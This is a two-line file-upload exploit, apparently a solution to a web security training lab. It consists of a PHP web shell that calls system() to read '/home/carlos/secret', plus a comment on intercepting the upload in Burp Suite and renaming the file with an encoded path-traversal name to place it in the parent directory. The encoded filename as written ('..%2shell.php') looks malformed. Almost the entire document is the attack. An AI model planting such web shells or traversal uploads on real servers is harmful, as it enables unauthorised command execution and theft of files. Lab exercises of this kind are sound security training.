<?php echo system("cat /home/carlos/secret") ?>

/* Send this file, intercept in Burp Suite, change the filename to "..%2shell.php" to put the file in the parent directory and apparently it doesn't work without obfuscating the / */